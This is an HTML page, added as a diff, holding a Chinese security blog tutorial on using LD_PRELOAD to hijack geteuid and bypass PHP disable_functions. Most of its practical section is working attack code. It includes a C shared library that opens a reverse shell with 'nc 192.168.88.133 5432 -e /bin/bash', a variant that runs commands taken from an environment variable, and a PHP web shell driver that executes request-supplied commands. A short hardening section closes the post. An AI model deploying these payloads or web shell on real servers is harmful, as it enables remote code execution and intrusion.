@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LD_PRELOAD 绕过：原理与实战</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@LD_PRELOAD 绕过：原理与实战 - Hzhsrc home">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://118.178.86.67/list/base_bug/rce/rce2/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://118.178.86.67//index.xml" title="Hzhsrc home">
+
+    
+
+
+    <meta property="og:title" content="LD_PRELOAD 绕过：原理与实战" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://118.178.86.67/list/base_bug/rce/rce2/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2024-05-06T11:20:00+08:00" />
+<meta property="article:modified_time" content="2024-05-06T11:20:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="LD_PRELOAD 绕过：原理与实战"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://118.178.86.67/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "基础漏洞",
+      "item": "http://118.178.86.67/list/base_bug/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "RCE",
+      "item": "http://118.178.86.67/list/base_bug/rce/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "LD_PRELOAD 绕过：原理与实战",
+      "item": "http://118.178.86.67/list/base_bug/rce/rce2/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "LD_PRELOAD 绕过：原理与实战",
+  "name": "LD_PRELOAD 绕过：原理与实战",
+  "description": "",
+  "keywords": [
+    "LD_PRELOAD", "绕过", "提权"
+  ],
+  "articleBody": "\rLD_PRELOAD 绕过 一、原理 示例脚本（PHP）：\n\u003c?php mail('','',''); ?\u003e 查看执行动作（演示思路）：\n# 使用 strace 跟踪 php 执行过程并输出到文件 strace -o 1.txt -f php demo.php # 过滤出 execve 调用 cat 1.txt | grep execve 说明：\n可以查看进程调用了哪些库函数与共享库。 如果发现某个被调用的库函数（例如 geteuid 或类似）来自可控的共享库，可通过 LD_PRELOAD 注入同名函数实现劫持，从而触发恶意代码执行。 示例 C 代码（通过重写 geteuid 注入 payload）：\n#include #include #include void payload() { system(\"echo '小可爱，你的邮件还能发出去吗？'\"); } int geteuid() { unsetenv(\"LD_PRELOAD\"); payload(); return 0; // 保持原行为（视需要返回合理值） } 编译共享库：\ngcc -shared -fPIC demo.c -o demo.so 执行思路：在目标进程环境中设置 LD_PRELOAD=/path/to/demo.so 后启动或触发目标二进制/脚本，从而执行注入的 payload。\n二、实战 1. 条件（示例） 基本要求：\n目标以可受 LD_PRELOAD 影响的方式加载共享库（通常是动态链接的可执行程序）。 有办法设置或注入环境变量（例如通过某些接口、可写的服务脚本、或本地会话）。 2. 构造 payload 方式 1 — 直接执行反连（示例） 示例 C 代码（直接执行反连）：\n#include #include #include void payload() { system(\"nc 192.168.88.133 5432 -e /bin/bash\"); } int geteuid() { if (getenv(\"LD_PRELOAD\") == NULL) { return 0; } unsetenv(\"LD_PRELOAD\"); payload(); return 0; } 编译：\ngcc -shared -fPIC demo.c -o demo.so 方式 2 — 通过环境变量执行（更灵活） 示例 C 代码（从环境变量读取命令）：\n#include int geteuid() { const char* cmdline = getenv(\"EVIL_CMDLINE\"); // 从环境变量读取要执行的命令 if (getenv(\"LD_PRELOAD\") == NULL) { return 0; } unsetenv(\"LD_PRELOAD\"); // 避免再次触发 system(cmdline); return 0; } 配合的 PHP 驱动脚本（用于演示在目标环境里设置环境变量并触发 mail）：\n\u003c?php $cmd = $_REQUEST[\"cmd\"]; $out_path = $_REQUEST[\"outpath\"]; $evil_cmdline = $cmd.\" \u003e \".$out_path.\" 2\u003e\u00261\"; echo \"\ncmdline: \".$evil_cmdline; // 设置环境变量 EVIL_CMDLINE putenv(\"EVIL_CMDLINE=\".$evil_cmdline); // 设置 LD_PRELOAD 指向恶意共享库 $so_path = $_REQUEST[\"sopath\"]; putenv(\"LD_PRELOAD=\".$so_path); // 触发可导致加载共享库的函数（示例：mail） mail(\"\", \"\", \"\", \"\"); // 输出执行结果 echo \"\noutput: \".nl2br(file_get_contents($out_path)); ?\u003e 注意：\n上述为演示用途。实际环境会因权限、seLinux、AppArmor、binary hardening（比如 setuid 与 setgid 行为、LD_PRELOAD 在 setuid 程序上被忽略）而不同。 某些现代系统会在 setuid 可执行文件上忽略 LD_PRELOAD，或有 /etc/ld.so.preload 限制，需结合具体场景判断可行性。 补充说明（你提到的“蚁剑 插件disable_function”）：\n若目标为 PHP 并且 disable_functions 禁用了 system/exec 等函数，LD_PRELOAD 绕过仍可能有效 —— 因为你是替换/注入 libc 层或被调用库层的函数，而不是直接调用被禁用的 PHP 函数。但是否可行仍取决于目标进程如何调用底层函数以及 PHP 的编译/运行方式。 三、常见检测与防护建议 禁止非受信任用户设置 LD_PRELOAD 环境变量；避免在受信任服务中直接用不可信任的环境变量启动可执行文件。 对入口进行最小权限原则，避免以 root 或高权限运行不受信任的脚本/服务。 对关键二进制使用静态链接或在启动时清理不可控环境变量。 使用 seccomp、AppArmor、SELinux、或启用内核硬ening（如 grsecurity）降低注入风险。 对可疑的 strace/日志、异常网络连接和新出现的共享库加载行为保持告警。 四、参考 若需深入，建议查阅关于 LD_PRELOAD、动态链接器 ld.so 行为、以及 setuid 程序与环境变量处理的相关文档与 CVE 研究文章。 ",
+  "wordCount" : "268",
+  "inLanguage": "en",
+  "datePublished": "2024-05-06T11:20:00+08:00",
+  "dateModified": "2024-05-06T11:20:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://118.178.86.67/list/base_bug/rce/rce2/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsrc home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://118.178.86.67/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/images/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/hzhsec.png">
+
+<link rel="manifest" href="/images/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>LD_PRELOAD 绕过：原理与实战</h1>
+  </header>
+
+  <p>
+  <small>
+    May 6, 2024&nbsp;· 268 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#一原理">一、原理</a></li>
+    <li><a href="#二实战">二、实战</a>
+      <ul>
+        <li><a href="#1-条件示例">1. 条件（示例）</a></li>
+        <li><a href="#2-构造-payload">2. 构造 payload</a></li>
+      </ul>
+    </li>
+    <li><a href="#三常见检测与防护建议">三、常见检测与防护建议</a></li>
+    <li><a href="#四参考">四、参考</a></li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><style>
+img {
+  display: block;
+  margin: 0 auto;
+  max-width: 100%;
+  height: auto;
+}
+</style>
+<h1 id="ld_preload-绕过">LD_PRELOAD 绕过</h1>
+<h2 id="一原理">一、原理</h2>
+<img src="/static/屏幕截图 2024-12-27 180100.png">
+<img src="/static/屏幕截图 2024-12-27 180132.png">
+<p>示例脚本（PHP）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mail</span>(<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><img src="/static/屏幕截图 2024-12-27 181623.png">
+<p>查看执行动作（演示思路）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># 使用 strace 跟踪 php 执行过程并输出到文件
+</span></span><span style="display:flex;"><span>strace -o 1.txt -f php demo.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># 过滤出 execve 调用
+</span></span><span style="display:flex;"><span>cat 1.txt | grep execve
+</span></span></code></pre></div><img src="/static/屏幕截图 2024-12-27 181908.png">
+<p>说明：</p>
+<ul>
+<li>可以查看进程调用了哪些库函数与共享库。</li>
+<li>如果发现某个被调用的库函数（例如 <code>geteuid</code> 或类似）来自可控的共享库，可通过 LD_PRELOAD 注入同名函数实现劫持，从而触发恶意代码执行。</li>
+</ul>
+<img src="/static/屏幕截图 2024-12-27 182553.png">
+<p>示例 C 代码（通过重写 <code>geteuid</code> 注入 payload）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>#include &lt;stdlib.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;stdio.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;string.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>void payload() {
+</span></span><span style="display:flex;"><span>    system(&#34;echo &#39;小可爱，你的邮件还能发出去吗？&#39;&#34;);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int geteuid() {
+</span></span><span style="display:flex;"><span>    unsetenv(&#34;LD_PRELOAD&#34;);
+</span></span><span style="display:flex;"><span>    payload();
+</span></span><span style="display:flex;"><span>    return 0; // 保持原行为（视需要返回合理值）
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>编译共享库：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gcc -shared -fPIC demo.c -o demo.so
+</span></span></code></pre></div><img src="/static/屏幕截图 2024-12-27 183203.png">
+<p>执行思路：在目标进程环境中设置 <code>LD_PRELOAD=/path/to/demo.so</code> 后启动或触发目标二进制/脚本，从而执行注入的 <code>payload</code>。</p>
+<hr>
+<h2 id="二实战">二、实战</h2>
+<h3 id="1-条件示例">1. 条件（示例）</h3>
+<img src="/static/屏幕截图 2024-12-27 193730.png">
+<p>基本要求：</p>
+<ul>
+<li>目标以可受 <code>LD_PRELOAD</code> 影响的方式加载共享库（通常是动态链接的可执行程序）。</li>
+<li>有办法设置或注入环境变量（例如通过某些接口、可写的服务脚本、或本地会话）。</li>
+</ul>
+<h3 id="2-构造-payload">2. 构造 payload</h3>
+<h4 id="方式-1--直接执行反连示例">方式 1 — 直接执行反连（示例）</h4>
+<p>示例 C 代码（直接执行反连）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>#include &lt;stdlib.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;stdio.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;string.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>void payload() {
+</span></span><span style="display:flex;"><span>    system(&#34;nc 192.168.88.133 5432 -e /bin/bash&#34;);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int geteuid() {
+</span></span><span style="display:flex;"><span>    if (getenv(&#34;LD_PRELOAD&#34;) == NULL) { return 0; }
+</span></span><span style="display:flex;"><span>    unsetenv(&#34;LD_PRELOAD&#34;);
+</span></span><span style="display:flex;"><span>    payload();
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>编译：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gcc -shared -fPIC demo.c -o demo.so
+</span></span></code></pre></div><h4 id="方式-2--通过环境变量执行更灵活">方式 2 — 通过环境变量执行（更灵活）</h4>
+<p>示例 C 代码（从环境变量读取命令）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>#include &lt;stdlib.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int geteuid() {
+</span></span><span style="display:flex;"><span>    const char* cmdline = getenv(&#34;EVIL_CMDLINE&#34;); // 从环境变量读取要执行的命令
+</span></span><span style="display:flex;"><span>    if (getenv(&#34;LD_PRELOAD&#34;) == NULL) { return 0; }
+</span></span><span style="display:flex;"><span>    unsetenv(&#34;LD_PRELOAD&#34;); // 避免再次触发
+</span></span><span style="display:flex;"><span>    system(cmdline);
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>配合的 PHP 驱动脚本（用于演示在目标环境里设置环境变量并触发 mail）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>$cmd = $_REQUEST[&#34;cmd&#34;];
+</span></span><span style="display:flex;"><span>$out_path = $_REQUEST[&#34;outpath&#34;];
+</span></span><span style="display:flex;"><span>$evil_cmdline = $cmd.&#34; &gt; &#34;.$out_path.&#34; 2&gt;&amp;1&#34;;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo &#34;&lt;br /&gt;&lt;b&gt;cmdline: &lt;/b&gt;&#34;.$evil_cmdline;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// 设置环境变量 EVIL_CMDLINE
+</span></span><span style="display:flex;"><span>putenv(&#34;EVIL_CMDLINE=&#34;.$evil_cmdline);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// 设置 LD_PRELOAD 指向恶意共享库
+</span></span><span style="display:flex;"><span>$so_path = $_REQUEST[&#34;sopath&#34;];
+</span></span><span style="display:flex;"><span>putenv(&#34;LD_PRELOAD=&#34;.$so_path);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// 触发可导致加载共享库的函数（示例：mail）
+</span></span><span style="display:flex;"><span>mail(&#34;&#34;, &#34;&#34;, &#34;&#34;, &#34;&#34;);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// 输出执行结果
+</span></span><span style="display:flex;"><span>echo &#34;&lt;br /&gt;&lt;b&gt;output: &lt;/b&gt;&lt;br /&gt;&#34;.nl2br(file_get_contents($out_path));
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span></code></pre></div><img src="/static/屏幕截图 2024-12-27 202643.png">
+<p>注意：</p>
+<ul>
+<li>上述为演示用途。实际环境会因权限、seLinux、AppArmor、binary hardening（比如 <code>setuid</code> 与 <code>setgid</code> 行为、<code>LD_PRELOAD</code> 在 setuid 程序上被忽略）而不同。</li>
+<li>某些现代系统会在 <code>setuid</code> 可执行文件上忽略 <code>LD_PRELOAD</code>，或有 <code>/etc/ld.so.preload</code> 限制，需结合具体场景判断可行性。</li>
+</ul>
+<p>补充说明（你提到的“蚁剑 插件disable_function”）：</p>
+<ul>
+<li>若目标为 PHP 并且 <code>disable_functions</code> 禁用了 <code>system</code>/<code>exec</code> 等函数，LD_PRELOAD 绕过仍可能有效 —— 因为你是替换/注入 libc 层或被调用库层的函数，而不是直接调用被禁用的 PHP 函数。但是否可行仍取决于目标进程如何调用底层函数以及 PHP 的编译/运行方式。</li>
+</ul>
+<hr>
+<h2 id="三常见检测与防护建议">三、常见检测与防护建议</h2>
+<ul>
+<li>禁止非受信任用户设置 <code>LD_PRELOAD</code> 环境变量；避免在受信任服务中直接用不可信任的环境变量启动可执行文件。</li>
+<li>对入口进行最小权限原则，避免以 root 或高权限运行不受信任的脚本/服务。</li>
+<li>对关键二进制使用静态链接或在启动时清理不可控环境变量。</li>
+<li>使用 seccomp、AppArmor、SELinux、或启用内核硬ening（如 grsecurity）降低注入风险。</li>
+<li>对可疑的 <code>strace</code>/日志、异常网络连接和新出现的共享库加载行为保持告警。</li>
+</ul>
+<hr>
+<h2 id="四参考">四、参考</h2>
+<ul>
+<li>若需深入，建议查阅关于 <code>LD_PRELOAD</code>、动态链接器 <code>ld.so</code> 行为、以及 setuid 程序与环境变量处理的相关文档与 CVE 研究文章。</li>
+</ul></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://118.178.86.67/list/base_bug/ssrf/ssrf1/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>常见协议与 SSRF 利用</span></a>
+    
+    
+    <a class="next" href="http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up2/"><span>文件解析与存储方案：权限、解码与 OSS</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://118.178.86.67/">Hzhsrc home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
